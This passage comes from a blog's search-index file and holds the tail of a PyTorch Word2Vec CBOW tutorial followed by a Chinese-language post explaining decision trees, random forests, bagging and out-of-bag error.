spells.&quot;&quot;&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># By deriving a set from `raw_text`, we deduplicate the array</span></span><br><span class="line">vocab = <span class="built_in">set</span>(raw_text)</span><br><span class="line">vocab_size = <span class="built_in">len</span>(vocab)</span><br><span class="line"></span><br><span class="line">word_to_ix = &#123;word: i <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(vocab)&#125;</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(raw_text) - <span class="number">2</span>):</span><br><span class="line">    context = [raw_text[i - <span class="number">2</span>], raw_text[i - <span class="number">1</span>],</span><br><span class="line">               raw_text[i + <span class="number">1</span>], raw_text[i + <span class="number">2</span>]]</span><br><span class="line">    target = raw_text[i]</span><br><span class="line">    data.append((context, target))</span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, vocab_size, embedding_dim, context_size</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CBOW, self).__init__()</span><br><span class="line">        self.embeddings = nn.Embedding(vocab_size, embedding_dim)</span><br><span class="line">        self.linear1 = nn.Linear(context_size * embedding_dim, <span class="number">128</span>)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">128</span>, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        embeds = self.embeddings(inputs).view((<span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line">        out = F.relu(self.linear1(embeds))</span><br><span class="line">        out = self.linear2(out)</span><br><span class="line">        log_probs = F.log_softmax(out, dim=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(log_probs)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_context_vector</span>(<span class="params">context, word_to_ix</span>):</span></span><br><span class="line">    idxs = [word_to_ix[w] <span class="keyword">for</span> w <span class="keyword">in</span> context]</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(idxs, dtype=torch.long)</span><br><span class="line">make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">losses = []</span><br><span class="line">loss_function = nn.NLLLoss()</span><br><span class="line">model = CBOW(<span class="built_in">len</span>(vocab), embedding_dim=<span class="number">10</span>, context_size=CONTEXT_SIZE*<span class="number">2</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_loss = torch.Tensor([<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> context, target <span class="keyword">in</span> data:</span><br><span class="line">        context_ids = make_context_vector(context, word_to_ix)</span><br><span class="line">        context_ids = context_ids.to(device)</span><br><span class="line">        model.zero_grad()</span><br><span class="line">        log_probs = model(context_ids)</span><br><span class="line">        label = torch.tensor([word_to_ix[target]], dtype=torch.long)</span><br><span class="line">        label = label.to(device)</span><br><span class="line">        loss = loss_function(log_probs, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">    losses.append(total_loss)</span><br><span class="line"><span class="built_in">print</span>(losses)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.embeddings(make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix))</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p>[1] <a href="https://zhuanlan.zhihu.com/p/114538417">深入浅出Word2Vec原理解析 - 知乎 (zhihu.com)</a></p><p>[2] <a href="https://samaelchen.github.io/word2vec_pytorch/">word2vec的PyTorch实现 | 碎碎念 (samaelchen.github.io)</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> deep_learning </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> model </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RandomForest</title>
+      <link href="/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html"/>
+      <url>/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="决策树">决策树</h2><p>先来复习一下决策树，根据预测结果不同，决策树分为回归决策树和分类决策树。很多的决策树集成，就成为了森林。常见的算法有随机森林和GDBT。</p><span id="more"></span><meta name="referrer" content="no-referrer"/><p>决策树是一种树形结构每个内部分支都是基于一个属性，每个叶节点代表一种类型。其实决策树就是在将一个多维（特征个数）空间进行划分，切分，产生不同类别。</p><h3 id="分类决策树">分类决策树</h3><p>分类决策树本身就是通过计算信息增益，选择特征，根据特征的值的个数形成分支，剪支（还没学）。</p><p><span class="math inline">\(x_i\)</span>代表某个特征的取值，<span class="math inline">\(P(x_i)\)</span>代表该类型的占比，<strong>信息熵</strong>衡量的是该特征的<strong>混乱程度</strong>，公式：</p><p>​ <span class="math display">\[H(X)=-\sum_{i=1}^{n}p(x_i)log p(x_i)\]</span></p><p>决策树要做的就是通过对比使用每个特征进行分支产生的信息增益--信息熵的减少程度来选择特征。</p><p>参考：<a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p><h3 id="回归决策树">回归决策树</h3><h3 id="classification-and-regression-tree-cart">（classification and regression tree, CART）</h3><p>这里复习一下<strong>回归和拟合的区别</strong>：</p><p>回归分析：是一种统计学上分析数据的方法，目的在于了解两个或多个变量间<strong>是否相关</strong>、<strong>相关方向与强度</strong>，并建立数学模型以便观察特定变量来预测研究者感兴趣的变量。</p><p>拟合：是一种把现有数据透过数学方法来代入<strong>一条数式</strong>的表示方式。</p><p>回归决策树将一个内部节点中的所有数据的该特征的平均值作为预测值。</p><p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925133815973-632336899.png" alt="img" style="zoom: 50%;" /></p><figure><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925132930783-421450240.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="随机森林算法random-forestrf">随机森林算法（random forest,RF）</h2><h3 id="简介">简介</h3><p>随机森林是一种基于集成学习的思想和决策树模型而产生的分类器。<strong>集成学习（Ensemble Learning）</strong>通过使用多个弱分类器，来组成一个强分类器，提高准确率。使用多个不同决策树<strong>独立</strong>的决策结果，少数服从多数的方法来分类。</p><p>少数优秀的树的预测结果将会超脱于芸芸“噪音”，做出一个好的预测。将若干个弱分类器的分类结果进行投票选择，从而组成一个强分类器，这就是随机森林<strong>bagging</strong>的思想。bagging的代价是不用单棵决策树来做预测，<strong>具体哪个变量起到重要作用变得未知</strong>，所以bagging<strong>改进了预测准确率但损失了解释性</strong>。</p><h3 id="决策树生成规则">决策树生成规则</h3><ol type="1"><li>如果训练集大小为N，对于每棵树而言，随机且有放回地从训练集中的抽取N个训练样本（这种采样方式称为bootstrap sample方法），作为该树的训练集；（<strong>bootstrap sample取样方法</strong>，随机有放回）</li><li>如果每个样本的特征维度为M，指定一个常数m&lt;&lt;M，随机地从M个特征中选取m个特征子集，每次树进行分裂时，从这m个特征中选择最优的；</li><li>每棵树都尽最大程度的生长，并且没有剪枝过程。</li></ol><p><strong>解释</strong>：随机抽样可以让<strong>每个决策树使用的数据集不同</strong>，给出不同的预测结果。有放回不至于让每个决策树得到数据集中的一部分，这样的结果是<strong>片面的</strong>。</p><p>两个随机：随机取样和随机取m个特征。</p><h3 id="分类效果">分类效果</h3><ul><li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li><li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li></ul><p>　　减小特征选择个数m，树的相关性和分类能力也会相应的降低；增大m，两者也会随之增大。所以关键问题是如何选择最优的m（或者是范围），这也是随机森林唯一的一个参数。</p><h3 id="袋外错误率out-of-bag-error">袋外错误率（out of bag error）</h3><p>袋外错误率主要用于选取最佳的m值。</p><p>对每个样本，使用没有选择这个样本的决策树进行预测，使用少数服从多数的方法，得到预测结果。</p><p>最终得到每个样本是否被正确预测，计算袋外错误率。</p><h3 id="代码使用">代码使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">100</span>)<span class="comment">#树的数量</span></span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/373879791">决策树之分类树与回归树 - 知乎 (zhihu.com)</a></p><p>[<a href="https://zhuanlan.zhihu.com/p/406627649">机器学习基础复习] 随机森林(Random Forest) - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/cpc784221489/article/details/92085702">(12条消息) 随机森林算法详解_阿斯达克-CSDN博客_随机森林详解</a></p><p>https://www.zhihu.com/question/24904495/answer/371618173</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> machine_learning </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> model </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
